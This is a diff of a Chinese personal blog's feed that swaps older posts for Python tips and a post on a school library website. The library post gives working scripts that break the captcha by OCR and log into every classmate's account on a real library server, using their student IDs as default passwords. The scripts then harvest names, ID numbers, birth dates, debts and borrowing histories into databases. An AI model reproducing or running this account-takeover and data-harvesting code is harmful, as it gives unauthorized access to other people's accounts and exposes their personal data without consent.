+[1, 4, 9, 16, 16, 25, 36, 49, 64, 81]
+</code></pre><ul>
+<li>filter</li>
+</ul>
+<p>filter 函数接受两个参数， 一个函数， 一个序列， 并把函数作用与序列的每一个元素， 并通过True or False， 来判断是否保留元素。</p>
+<pre><code>test = filter(lambda x : x &gt; 5, [1, 3, 4, 6, 7, 8, 9])
+
+list(test)
+
+[6, 7, 8, 9]
+</code></pre><ul>
+<li>int</li>
+</ul>
+<p>int 函数可以返回 整数</p>
+<pre><code>int(12.3)
+return 12
+</code></pre><p>而且 int 函数可以返回， 字符串的进制数</p>
+<pre><code>int(&#39;0001&#39;, 2)
+
+return 1
+
+其中的 ‘0001’ 必须以字符串的形式输入， 返回的是2进制数
+</code></pre><ul>
+<li>join</li>
+</ul>
+<p>join 函数 string.join(seq), 其中seq是一个序列， string为字符串，</p>
+<pre><code>&#39;+&#39;.join(map(str,range(7)))
+
+return &#39;0+1+2+3+4+5+6&#39;
+</code></pre><ul>
+<li>operator 模块</li>
+</ul>
+<p>python 内置的模块，operator为c代码编写， 其速度更快。</p>
+<p>算术操作符：</p>
+<pre><code>import operator
+
+operator.add(1, 2)
+operator.sub(1, 2)
+operator.mul(1, 2)
+operator.turediv(1, 2)# 浮点除法
+operator.floortdiv(1, 2)# 整数除法
+operator.mod(1, 2)
+</code></pre><p>其他可参见 (operator)[<a href="https://docs.python.org/3/library/operator.html" target="_blank" rel="external">https://docs.python.org/3/library/operator.html</a>]</p>
+<ul>
+<li>list and string</li>
+</ul>
+<p>list 的一个很实用的方法 list.count(obj),</p>
+<p>string.count(obj)</p>
+<pre><code>test = &#39;fhaognaorghksangjalgjl&#39;
+
+test.count(&#39;n&#39;)# return 2
+
+list(test).count(&#39;n&#39;)# return 2
+</code></pre><ul>
+<li>math</li>
+</ul>
+<p>math 函数， math.modf() 返回数字的小数部分，<br>其中 is_integer() 函数</p>
+<pre><code>test = math.sqrt(155)
+
+&gt;&gt;&gt; math.modf(test)
+(0.4498995979887326, 12.0)
+
+&gt;&gt;&gt; (2.0).is_integer()
+True
+&gt;&gt;&gt; (3.2).is_integer()
+False
+</code></pre><ul>
+<li>@classmethod and @staticmethod 的区别</li>
+</ul>
+<p>py中要想调用类中的一个方法， 要先实例化一个对象在调用。<br>而使用@classmethod和@staticmethod则不需要实例化， 直接使用 类名.方法名来调用</p>
+<p>很优雅，<br>他们的区别：</p>
+<p>@staticmethod 不需要表达自身的对象的self参数和自身类的cls的参数</p>
+<p>@classmethod 不需要表达自身de对象的self参宿， 但是第一个参数必须是表达自身类的cls参数</p>
+<pre><code>class A(object):  
+    bar = 1  
+    def foo(self):  
+        print &#39;foo&#39;  
+
+    @staticmethod  
+    def static_foo():  
+        print &#39;static_foo&#39;  
+        print A.bar  
+
+    @classmethod  
+    def class_foo(cls):  
+        print &#39;class_foo&#39;  
+        print cls.bar  
+        cls().foo()  
+
+A.static_foo()  
+A.class_foo()
+</code></pre><p>输出</p>
+<pre><code>static_foo
+1
+class_foo
+1
+foo
+</code></pre><ul>
+<li>itertools</li>
+</ul>
+<p>itertools用于高效循环的迭代函数集合</p>
 ]]></content>
     
     <summary type="html">
     
       &lt;ul&gt;
-&lt;li&gt;有生理缺陷&lt;/li&gt;
-&lt;li&gt;有心理缺陷&lt;/li&gt;
-&lt;li&gt;没有值得喜欢的人&lt;/li&gt;
+&lt;li&gt;reduce&lt;/li&gt;
 &lt;/ul&gt;
+&lt;p&gt;reduce 把一个函数作用在序列上， 这个函数必须有两个参数， 它把结果继续作用在序列的下一个元素上。&lt;/p&gt;
+&lt;p&gt;比如一个列表内元素的所用的乘积：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from functools import reduce
 
+list = [1, 2, 3, 4, 5, 6, 7, 8, 9]
+
+reduce(lambda x, y: x*y, list)
+
+return 362880
+&lt;/code&gt;&lt;/pre&gt;
     
     </summary>
     
     
-  </entry>
-  
-  <entry>
-    <title>If I Die Young</title>
-    <link href="https://blog.whilte.cn/2016/04/01/if-i-die-young/"/>
-    <id>https://blog.whilte.cn/2016/04/01/if-i-die-young/</id>
-    <published>2016-04-01T08:12:11.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>If I die young bury me in satin<br>若我英年早逝，请将我葬在绸缎中</p>
-<p>Lay me down on a bed of roses<br>让我躺在铺满玫瑰的床上</p>
-<p>Sink me in the river at dawn<br>在黎明时分将我沉入河中</p>
-<p>Send me away with the words of a love song<br>用情歌中的词句为我送行</p>
-<p>——「If I Die Young」</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;If I die young bury me in satin&lt;br&gt;若我英年早逝，请将我葬在绸缎中&lt;/p&gt;
-&lt;p&gt;Lay me down on a bed of roses&lt;br&gt;让我躺在铺满玫瑰的床上&lt;/p&gt;
-&lt;p&gt;Sink me in the river at daw
-    
-    </summary>
-    
+      <category term="python" scheme="https://blog.whilte.cn/tags/python/"/>
     
   </entry>
   
   <entry>
-    <title>如何部署 Node.js 应用</title>
-    <link href="https://blog.whilte.cn/2016/03/23/deploy-node-app/"/>
-    <id>https://blog.whilte.cn/2016/03/23/deploy-node-app/</id>
-    <published>2016-03-23T07:37:20.000Z</published>
-    <updated>2017-04-23T10:44:16.167Z</updated>
+    <title>关于学校图书馆网站</title>
+    <link href="https://blog.whilte.cn/2017/01/27/%E5%85%B3%E4%BA%8E%E5%AD%A6%E6%A0%A1%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%BD%91%E7%AB%99/"/>
+    <id>https://blog.whilte.cn/2017/01/27/关于学校图书馆网站/</id>
+    <published>2017-01-27T02:57:24.000Z</published>
+    <updated>2017-04-15T08:35:44.092Z</updated>
     
-    <content type="html"><![CDATA[<p>当你熟悉 Node.js 之后很可能会自己写些小东西放在 VPS 上跑，比如说一个个人的 API 服务，或者是你的网站。这篇文章分享的内容不管你的 app 大小，都相对适用，因为我们的原则是「run it forever and deploy it smartly」。</p>
-<h2 id="上传代码"><a href="#上传代码" class="headerlink" title="上传代码"></a><span>上传代码</span></h2><p>首先你需要的是把你的 app 代码从本地上传到 VPS，我们不可能用上个世纪的 ftp 方式上传。我们开发的时候用 git 同步本地仓库和远程仓库的代码，你一定有屡试不爽的感觉，同理，这里我们也将使用 git 来操作。</p>
-<p>以下内容都可以用 <a href="https://github.com/yyx990803/pod" target="_blank" rel="external">pod</a> 这个工具来代替，不过相应的你需要用 <a href="https://github.com/Unitech/pm2" target="_blank" rel="external">PM2</a> 来管理进程。而这里是个相对 general case。</p>
-<p>首先我们确认一下：</p>
+    <content type="html"><![CDATA[<p>前段时间看完了python网络数据收集这本书，自己想练习一下。<br>联想到刚入学时的时候登陆学校图书馆网站，初始密码是学号，觉得很鸡肋，<br>觉得用模拟登陆和验证码识别，就可以爬下我们学院每个人的图书借阅记录和个人信息，<br>顿时很有兴趣，就动手了。</p>
 <ul>
-<li><code>/var/repo</code> - 这是 VPS 上存储 git repo 的目录</li>
-<li><code>/var/www</code> - 这是 VPS 的网站目录</li>
+<li>验证码</li>
 </ul>
-<h3 id="在-VPS-上创建一个空-repo"><a href="#在-VPS-上创建一个空-repo" class="headerlink" title="在 VPS 上创建一个空 repo"></a>在 VPS 上创建一个空 repo</h3><pre><code class="bash">$ mkdir -p /var/repo/app.git
-$ cd /var/repo/app.git
-$ git init --bare
-</code></pre>
-<p>现在你就拥有了一个只存在版本管理功能，不包含任何 app 源文件的 git 仓库。</p>
-<h3 id="部署的钩子"><a href="#部署的钩子" class="headerlink" title="部署的钩子"></a>部署的钩子</h3><p>你需要一个钩子 <code>git hook</code>，也就是在每次本地 git push 之后让它自动把上传的文件拷贝到你的网站目录中。这里我们使用 git 内置的 <code>post-receive</code> 钩子：</p>
-<pre><code class="bash">$ cd hooks
-# 写入内容到这个文件
-$ cat &gt; post-receive
-# 回车，输入如下内容：
-</code></pre>
-<pre><code class="bash">#!/bin/sh
-git --work-tree=/var/www/domain.com --git-dir=/var/repo/app.git checkout -f
-cd /var/www/domain.com
-npm install
-# 这里还可以加一些构建脚本，比如 npm run build
-</code></pre>
-<p>最后，按下 Ctrl+D 来确认保存。</p>
-<p>为了让你有权限执行这个文件，你需要:</p>
-<pre><code class="bash">$ chmod +x post-receive
-</code></pre>
-<h3 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h3><p>退出 VPS：</p>
-<pre><code class="bash">$ exit
-</code></pre>
-<p>在你的 app 目录里执行：</p>
-<pre><code class="bash">$ git remote add server ssh://user@yourdomain.com/var/repo/app.git
-</code></pre>
-<p>哇哦，搞定了。试着将你的 web app 发布吧，就是简单地提交而已：</p>
-<pre><code class="bash">$ git add -A
-$ git commit -m &quot;deploy to server&quot;
-$ git push server master
-</code></pre>
-<p>然后检查一下 <code>/var/www/domain.com</code> 吧，你的代码都被同步过去了。</p>
-<h2 id="持久运行你的-app"><a href="#持久运行你的-app" class="headerlink" title="持久运行你的 app"></a><span>持久运行你的 app</span></h2><p>你需要持久化运行你的 app，因为它很可能在高峰时段 crash 掉，同时你也希望在系统重启之后你的 app 也能自动重启。</p>
-<p>你大可参考 <a href="http://support.ghost.org/deploying-ghost/#making-ghost-run-forever" target="_blank" rel="external">Ghost 部署指南</a> 来达到这个目的。非常完整，我就不再赘述，不过我推荐使用 Supervisor。</p>
-<p>你也可以考虑使用 <a href="https://nodejs.org/en/docs/guides/nodejs-docker-webapp/" target="_blank" rel="external">docker</a> 这个更现代(?)的解决方案。</p>
-<h2 id="延伸阅读"><a href="#延伸阅读" class="headerlink" title="延伸阅读"></a><span>延伸阅读</span></h2><ul>
-<li><a href="https://certsimple.com/blog/deploy-node-on-linux" target="_blank" rel="external">How to deploy your node app on Linux, 2016 edition</a></li>
-<li><a href="https://www.terlici.com/2015/06/20/running-node-forever.html" target="_blank" rel="external">Running your Node &amp; Express apps forever, no matter what, with Systemd and PM2</a></li>
-<li><a href="http://serverfault.com/questions/191331/should-servers-have-their-timezone-set-to-gmt-utc" target="_blank" rel="external">Should servers have their timezone set to GMT/UTC?</a></li>
-<li><a href="https://blog.risingstack.com/operating-node-in-production/" target="_blank" rel="external">Operating Node.js in Production</a></li>
-<li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-haproxy-to-set-up-http-load-balancing-on-an-ubuntu-vps" target="_blank" rel="external">How To Use HAProxy to Set Up HTTP Load Balancing on an Ubuntu VPS</a></li>
-<li><a href="https://blog.risingstack.com/node-js-security-tips/" target="_blank" rel="external">Node.js Security Tips</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;当你熟悉 Node.js 之后很可能会自己写些小东西放在 VPS 上跑，比如说一个个人的 API 服务，或者是你的网站。这篇文章分享的内容不管你的 app 大小，都相对适用，因为我们的原则是「run it forever and deploy it smartly」。&lt;/p
-    
-    </summary>
-    
-    
-      <category term="deploy" scheme="https://blog.whilte.cn/tags/deploy/"/>
-    
-      <category term="node.js" scheme="https://blog.whilte.cn/tags/node-js/"/>
-    
-      <category term="docker" scheme="https://blog.whilte.cn/tags/docker/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>前端框架概览</title>
-    <link href="https://blog.whilte.cn/2016/03/21/front-end-frameworks/"/>
-    <id>https://blog.whilte.cn/2016/03/21/front-end-frameworks/</id>
-    <published>2016-03-21T05:31:32.000Z</published>
-    <updated>2017-04-23T10:44:16.167Z</updated>
-    
-    <content type="html"><![CDATA[<p>前端框架在近来是非常流行的词(Buzz word)，我现在就来介绍一下其中主流的框架，并且帮你区分什么是真正的「前端框架」。</p>
-<h2 id="流行词汇"><a href="#流行词汇" class="headerlink" title="流行词汇"></a><span>流行词汇</span></h2><p>一说起前端框架你就会听到一些看似很高深的词汇，比如 <code>mvvm</code> <code>vdom</code> <code>view layer</code> <code>unidirection</code> 等等，以及这些人们所谓的「框架」：</p>
+<p>验证码很顺利，学校的图书馆的验证码很容易识别，就用pytesseract很容易。</p>
+<pre><code>
+import pytesseract
+from PIL import Image
+import requests
+captcha_url =&quot;http://202.196.13.8:8080/reader/captcha.php&quot;
+img = requests.get(captcha_url).content
+code = pytesseract.image_to_string(img)
+print(code)
+</code></pre><a id="more"></a>
 <ul>
-<li>Bootstrap</li>
-<li>jQuery</li>
-<li>BackBone</li>
-<li>AngularJS</li>
-<li>React</li>
-<li>Vue</li>
+<li>cookie</li>
 </ul>
-<h2 id="框架大乱战"><a href="#框架大乱战" class="headerlink" title="框架大乱战"></a><span>框架大乱战</span></h2><h3 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h3><p>Bootstrap 是一个框架吗? 是的，就算它只是一系列<strong>常用 CSS 和 jQuery plugin</strong> 的集合，它还是一个框架。不过它更多的是一个常用代码片段的集合，而不是一个那种能带来设计模式的框架。</p>
-<p>Bootstrap 带给你的是栅格系统，是预置的按钮、表单、列表、导航、响应式等等样式，它在你独立开发的时候非常有用，因为能节约用来「设计网页」的时间，而且这套预置的样式本身「也不丑」，自然是受很多公司「前期快速开发」的青睐了。</p>
-<p>我更愿意把 Bootstrap 称为一个 UI library，就像与之类似的 <a href="http://purecss.io/" target="_blank" rel="external">purecss</a>、 <a href="foundation.zurb.com">Foundation</a> 一样。当然最近比较火的微信移动端使用的 UI 库 <a href="https://github.com/weui/weui" target="_blank" rel="external">weui</a> 自然也属于这个范畴。</p>
-<h3 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h3><p>jQuery 是一个现象，它重新定义了 dom 操作这一行为。</p>
-<p>从某种意义讲，jQuery 是一个 framework，因为它让直接操作 dom 来进行 UI 交互成为了一种设计模式（笑）。这是个玩笑， jQuery 更多只能看做一个更抽象的 DOM API，弥补的原生 DOM API 的不足，并增加了很多常用的 helper。</p>
-<p>常见的 Web 设计模式就是 MVC 和 MVVM，它们和 jQuery 之间另一个不同就是对于数据的处理。用 jQuery 写的代码常常直接用 dom 来和 data 打交道，需要「手动地」更新页面。反之 MVC 和 MVVM 通常把数据存储在 model 这个 layer 上，通过一定的绑定机制实施更有效率的页面渲染和更新。</p>
-<h3 id="BackBone"><a href="#BackBone" class="headerlink" title="BackBone"></a>BackBone</h3><p>BackBone 经常和 jQuery 一起用， MVC 模式 + 一个高度抽象的 DOM API 曾经征服了很多开发者的心。</p>
-<p>然而 BackBone 经常被人诟病为「不是 MVC」的 MVC，原因在于你很难把用 jQuery 写出的代码合理地用 MVC 模式来进行归纳，在我看来，这是因为没有一个规范的 View layer 来组织 dom 相关的代码。</p>
-<h3 id="Angular-Vue-React"><a href="#Angular-Vue-React" class="headerlink" title="Angular/Vue/React"></a>Angular/Vue/React</h3><p>详见 <a href="http://cn.vuejs.org/guide/comparison.html" target="_blank" rel="external">http://cn.vuejs.org/guide/comparison.html</a></p>
-<h2 id="我的选择"><a href="#我的选择" class="headerlink" title="我的选择"></a><span>我的选择</span></h2><p>在我看来 Vue 和 React 是更现代的选择，Angular 2 的学习曲线看起来十分陡峭，让我望而生畏，有爱好者也可以尝试一下。</p>
-<p>Vue 和 React 最大的区别就是社区的活跃度和成熟度。</p>
-<p>React 社区看似活跃和成熟但是所谓的 best practice 层出不穷，有时候 <a href="http://sam.js.org/" target="_blank" rel="external">一个东西</a> 换了一个名字就能拿出来卖弄一番，扰乱视听。</p>
-<p>Vue 社区则看起来更加专制，现状是各路菊苣为 <a href="http://evanyou.me/" target="_blank" rel="external">小右</a>  马首是瞻。这不是不好，非常好，正确的东西有很多人追随这没有不对的。而且现在社区也在蓬勃发展，小右本人也开始全职开发 Vue 和相关生态组件。</p>
-<h2 id="如何学习一个框架"><a href="#如何学习一个框架" class="headerlink" title="如何学习一个框架"></a><span>如何学习一个框架</span></h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>首先熟悉这个框架是最基本的，通过阅读官方的一些 guide 并且自己动手操作比较好的做法，比如在 <a href="http://jsbin.com/" target="_blank" rel="external">JSbin</a> 上试试 Vue。这方面 Vue 的 <a href="http://cn.vuejs.org/guide/" target="_blank" rel="external">官方教程</a> 由浅入深、面面俱到堪称业界典范。</p>
-<h3 id="生态"><a href="#生态" class="headerlink" title="生态"></a>生态</h3><p>一个没有生态的框架是活不长的，生态的重要性之一是节省了开发者重复劳动的时间。所以你下一步就是广泛了解相关生态，比如你会用 React 做 todomvc 之后可以去看看 <a href="https://github.com/enaqx/awesome-react" target="_blank" rel="external">awesome-react</a>，通常那里也会有一些前人写的指南。</p>
-<h3 id="持续学习"><a href="#持续学习" class="headerlink" title="持续学习"></a>持续学习</h3><p>我自认为作为开发者的一个好习惯就是「凡事尽量自己解决」，有些东西即使别人一次给你说清了，你没有自己解决的经验下次再遇到类似的问题很难触类旁通。</p>
-<p>「自己解决」不是指自己做个伸手党，而是指能 Google 就绝不<del>百度</del>，能<del>百度</del>就绝不提问，能提问就尽量描述清楚，能描述清楚就想想能不能通过 Google 解决。</p>
+<p>其实cookie的处理，我也学习一些库的使用，起初实验了很多次，都是无法进入登陆后的页面，<br>后来用了一个库http.cookiejar就顺利解决了。</p>
+<pre><code># 打开session。
+session = requests.Session()
+# 保存cookies
+session.cookies = cookielib.LWPCookieJar(filename=&#39;cookies&#39;)
+try:
+    # session加载cookies
+    session.cookies.load(ignore_discard=True)
+except:
+    print(&quot;Cookie 未能加载&quot;)
+</code></pre><ul>
+<li>编码</li>
+</ul>
+<p>编码真是蛋疼到爆呀，每次print都是一堆乱码，编码让我怀疑人生的说，<br>我也知道cmd上print不了UTF-8，我的atom也是如此，pycharm也要改一下encoding，<br>这是才知python的idle才是最好用的。</p>
+<pre><code>info = session.get(&quot;http://202.196.13.8:8080/reader/redr_info.php&quot;,
+                   headers=headers).content.decode(&quot;UTF-8&quot;)
+</code></pre><h4 id="code"><a href="#code" class="headerlink" title="code:"></a>code:</h4><pre><code>
+import requests
+from bs4 import BeautifulSoup
+import time
+import http.cookiejar as cookielib
+import pymongo
+import pytesseract
+from PIL import Image
+
+
+# 连接mongodb
+client = pymongo.MongoClient(&quot;localhost&quot;, 27017, connect=False)
+library = client[&#39;library&#39;]
+library_info = library[&#39;ys13&#39;]
+# 设置headers
+headers = {
+    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;,
+    &#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;,
+    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8&#39;,
+    &#39;Cache-Control&#39;: &#39;max-age=0&#39;,
+    &#39;Connection&#39;: &#39;keep-alive&#39;,
+    &#39;Host&#39;: &#39;202.196.13.8:8080&#39;,
+    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36&#39;
+}
+# 打开session。
+session = requests.Session()
+# 保存cookies
+session.cookies = cookielib.LWPCookieJar(filename=&#39;cookies&#39;)
+try:
+    # session加载cookies
+    session.cookies.load(ignore_discard=True)
+except:
+    print(&quot;Cookie 未能加载&quot;)
+
+
+
+def get_captcha():
+    captcha_url = &quot;http://202.196.13.8:8080/reader/captcha.php&quot;
+    x = 0
+    bin = session.get(captcha_url, headers=headers).content
+    with open(&quot;/home/jasd/python/%s.jpg&quot; % x, &quot;wb&quot;)as file:
+        file.write(bin)
+    image = Image.open(&quot;/home/jasd/python/0.jpg&quot;)
+    code = pytesseract.image_to_string(image)
+    return code
+
+
+# get_chaptcha()主要使用tesseract来通过subprocess来将验证码识别
+# login()为登陆函数，可采集集信息， 并放置于mongodb中
+
+
+def login(xuehao):
+    from_data = {
+        &#39;number&#39;: xuehao,
+        &#39;passwd&#39;: xuehao,
+        &#39;captcha&#39;: get_captcha(),
+        &#39;select&#39;: &#39;cert_no&#39;,
+        &#39;returnUrl&#39;: &#39;&#39;,
+        }
+    session.post(&quot;http://202.196.13.8:8080/reader/redr_verify.php&quot;,
+                 data=from_data, headers=headers)
+    info = session.get(&quot;http://202.196.13.8:8080/reader/redr_info.php&quot;,
+                       headers=headers).content.decode(&quot;UTF-8&quot;)
+    soup = BeautifulSoup(info, &quot;lxml&quot;)
+    if soup.find(&#39;div&#39;, {&#39;id&#39;: &#39;mylib_content&#39;}):
+        mylib_info = soup.findAll(&quot;td&quot;)
+        mylib_msg = soup.findAll(&quot;a&quot;, {&#39;href&#39;: &quot;book_lst.php&quot;})
+        data = {
+            &#39;姓名&#39;: mylib_info[1].get_text().split(&quot;：&quot;)[1],
+            &#39;证件号&#39;: mylib_info[2].get_text().split(&quot;：&quot;)[1],
+            &#39;累计借书&#39;: mylib_info[12].get_text().split(&quot;：&quot;)[1],
+            &#39;五天内即将过期图书&#39;: mylib_msg[1].get_text().split(&quot;[&quot;)[1].split(&quot;]&quot;)[0],
+            &#39;已超期图书&#39;: mylib_msg[2].get_text().split(&quot;[&quot;)[1].split(&quot;]&quot;)[0],
+            &#39;欠款金额&#39;: mylib_info[14].get_text().split(&quot;：&quot;)[1],
+            &#39;工作单位&#39;: mylib_info[18].get_text().split(&quot;：&quot;)[1],
+            &#39;职业/职称&#39;: mylib_info[19].get_text().split(&quot;：&quot;)[1],
+            &#39;性别&#39;: mylib_info[21].get_text().split(&quot;：&quot;)[1],
+            &#39;出生日期&#39;: mylib_info[26].get_text().split(&quot;：&quot;)[1],
+            }
+        print(data)
+        library_info.insert_one(data)
+        session.cookies.save()
+    else:
+        pass
+
+
+if __name__ == &#39;__main__&#39;:
+    time.sleep(2)
+    for i in range(541310020101, 541310020161):
+        login(str(i))
+</code></pre><h4 id="通过分析数据可以得到以下图表："><a href="#通过分析数据可以得到以下图表：" class="headerlink" title="通过分析数据可以得到以下图表："></a>通过分析数据可以得到以下图表：</h4><p><img src="http://oava7ylm5.bkt.clouddn.com/chart_math.png" alt="math"></p>
+<h4 id="另附上关于每个人的图书借阅情况的code："><a href="#另附上关于每个人的图书借阅情况的code：" class="headerlink" title="另附上关于每个人的图书借阅情况的code："></a>另附上关于每个人的图书借阅情况的code：</h4><pre><code>import requests
+from bs4 import BeautifulSoup
+import subprocess
+import time
+import http.cookiejar as cookielib
+import pymysql
+conn = pymysql.connect(host=&#39;localhost&#39;, user=&#39;root&#39;, password=&#39;jian&#39;,
+                       port=3306, db=&#39;scraping&#39;, charset=&#39;utf8&#39;)
+cur = conn.cursor()
+cur.execute(&quot;use scraping&quot;)
+cur.execute(&quot;create table yingshu_2015(条形码 INT(100), 书名 VARCHAR(200), 作者 VARCHAR(200), 借阅日期 DATE , 归还日期 DATE , 馆藏地 VARCHAR(200))&quot;)
+headers = {
+    &#39;Accept&#39;: (&#39;text/html,application/xhtml+xml,application/xml;q=0.9,
+               image/webp,*/*;q=0.8&#39;,)
+    &#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;,
+    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8&#39;,
+    &#39;Cache-Control&#39;: &#39;max-age=0&#39;,
+    &#39;Connection&#39;: &#39;keep-alive&#39;,
+    &#39;Host&#39;: &#39;202.196.13.8:8080&#39;,
+    &#39;Origin&#39;: &#39;http://202.196.13.8:8080&#39;,
+    &#39;Referer&#39;: &#39;http://202.196.13.8:8080/reader/login.php&#39;,
+    &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,
+    &#39;User-Agent&#39;: (&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+                   (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&#39;,)
+    }
+session = requests.Session()
+session.cookies = cookielib.LWPCookieJar(filename=&#39;cookies&#39;)
+try:
+    session.cookies.load(ignore_discard=True)
+except:
+    print(&quot;Cookie 未能加载&quot;)
+def get_captcha():
+    captcha_url =&quot;http://202.196.13.8:8080/reader/captcha.php&quot;
+    x = 0
+    bin = session.get(captcha_url, headers=headers).content
+    with open(&quot;d:/python/euler/%s.jpg&quot; % x, &quot;wb&quot;)as file:
+        file.write(bin)
+        file.close()
+    p = subprocess.Popen([&quot;tesseract&quot;, &quot;d:/python/euler/0.jpg&quot;,
+    &quot;d:/python/euler/captcha&quot;], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    p.wait()
+    f = open(&quot;d:/python/euler/captcha.txt&quot;, &quot;r&quot;)
+    captcharesponse = f.read().replace(&quot; &quot;, &quot; &quot;).replace(&quot;\n&quot;, &quot;&quot;)
+    return captcharesponse
+def login(xuehao):
+    from_data = {
+        &#39;number&#39;: xuehao,
+        &#39;passwd&#39;: password,
+        &#39;captcha&#39;: get_captcha(),
+        &#39;select&#39;: &#39;cert_no&#39;,
+        &#39;returnUrl&#39;: &#39;&#39;,
+    }
+    data = {
+        &#39;para_string&#39;: &#39;all&#39;,
+        &#39;topage&#39;: &#39;1&#39;,
+    }
+    time.sleep(2)
+    session.post(&quot;http://202.196.13.8:8080/reader/redr_verify.php&quot;,
+                 data=from_data, headers=headers)
+    session.get(&quot;http://202.196.13.8:8080/reader/redr_info.php&quot;,
+                headers=headers).content.decode(&quot;UTF-8&quot;)
+    book_info = session.post(&quot;http://202.196.13.8:8080/reader/book_hist.php&quot;,
+                             headers=headers, data=data).content.decode(&quot;UTF-8&quot;)
+    soup = BeautifulSoup(book_info, &quot;lxml&quot;)
+    book_info = soup.findAll(&quot;tr&quot;)
+    for i in range(1, len(book_info)):
+        print(book_info[i].get_text().split(&quot;\n&quot;))
+        cur.execute(&quot;insert into yingshu_2015(条形码, 书名, 作者, 借阅日期, 归还日期, 馆藏地)
+        VALUES (%s, %s, %s, %s, %s, %s)&quot;, (book_info[i].get_text().split(&quot;\n&quot;)[2], book_info[i].get_text().split(&quot;\n&quot;)[3], book_info[i].get_text().split(&quot;\n&quot;)[4], book_info[i].get_text().split(&quot;\n&quot;)[5], book_info[i].get_text().split(&quot;\n&quot;)[6], book_info[i].get_text().split(&quot;\n&quot;)[7]))
+        conn.commit()
+    session.cookies.save()
+if __name__ == &#39;__main__&#39;:
+    for i in range(541510020141, 541510020161):
+        login(&quot;541510020140&quot;)
+        print(i)
+</code></pre><p>其实我的目的是写一个能够知道我借阅的图书到期是给我发mail，提醒我，如果可以续借帮我续借的脚本，<br>当然我还在写(手动微笑)。。。</p>
+<hr>
+<p>更新线</p>
+<p>关于图书馆借阅脚本，已经写的差不多了，代码有点挫；<br><a href="https://github.com/jianaosiding/spider_code/blob/master/library.py" target="_blank" rel="external">code</a></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;前端框架在近来是非常流行的词(Buzz word)，我现在就来介绍一下其中主流的框架，并且帮你区分什么是真正的「前端框架」。&lt;/p&gt;
-&lt;h2 id=&quot;流行词汇&quot;&gt;&lt;a href=&quot;#流行词汇&quot; class=&quot;headerlink&quot; title=&quot;流行词汇&quot;&gt;&lt;/a&gt;&lt;spa
+      &lt;p&gt;前段时间看完了python网络数据收集这本书，自己想练习一下。&lt;br&gt;联想到刚入学时的时候登陆学校图书馆网站，初始密码是学号，觉得很鸡肋，&lt;br&gt;觉得用模拟登陆和验证码识别，就可以爬下我们学院每个人的图书借阅记录和个人信息，&lt;br&gt;顿时很有兴趣，就动手了。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;验证码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;验证码很顺利，学校的图书馆的验证码很容易识别，就用pytesseract很容易。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+import pytesseract
+from PIL import Image
+import requests
+captcha_url =&amp;quot;http://202.196.13.8:8080/reader/captcha.php&amp;quot;
+img = requests.get(captcha_url).content
+code = pytesseract.image_to_string(img)
+print(code)
+&lt;/code&gt;&lt;/pre&gt;
     
     </summary>
     
     
-      <category term="javascript" scheme="https://blog.whilte.cn/tags/javascript/"/>
-    
-      <category term="frontend" scheme="https://blog.whilte.cn/tags/frontend/"/>
-    
-      <category term="js" scheme="https://blog.whilte.cn/tags/js/"/>
-    
-      <category term="bootstrap" scheme="https://blog.whilte.cn/tags/bootstrap/"/>
-    
-      <category term="jquery" scheme="https://blog.whilte.cn/tags/jquery/"/>
-    
-      <category term="vue" scheme="https://blog.whilte.cn/tags/vue/"/>
-    
-      <category term="react" scheme="https://blog.whilte.cn/tags/react/"/>
-    
-      <category term="mvvm" scheme="https://blog.whilte.cn/tags/mvvm/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>新的作息时间</title>
-    <link href="https://blog.whilte.cn/2016/03/03/new-timetable/"/>
-    <id>https://blog.whilte.cn/2016/03/03/new-timetable/</id>
-    <published>2016-03-03T07:39:02.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>是时候告别淫乱的日子，我打算开始一个健康规律的作息时间。</p>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a><span>准备工作</span></h2><p>睡觉时间: 晚上 10 点到次日凌晨 5 点。<br>学习时间: 早上 5 点 20 分到 6 点半。<br>洗澡时间: 早上 6 点半到 7 点。<br>早饭时间: 早上 7 点到 7 点 20 分。</p>
-<h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a><span>热身</span></h2><p>每天去 StackOverflow/SegmentFault 回答问题。</p>
-<p>时间是早上 7 点半到 9 点以前。</p>
-<h2 id="日落"><a href="#日落" class="headerlink" title="日落"></a><span>日落</span></h2><p>晚上 7 点半之前到家，8 点半到 9 点半跑步，之后随意嘿嘿嘿。</p>
-<h2 id="周末"><a href="#周末" class="headerlink" title="周末"></a><span>周末</span></h2><p>周六是休息时间，不写代码不工作。</p>
-<p>周日和工作日一样。</p>
-]]></content>
-    
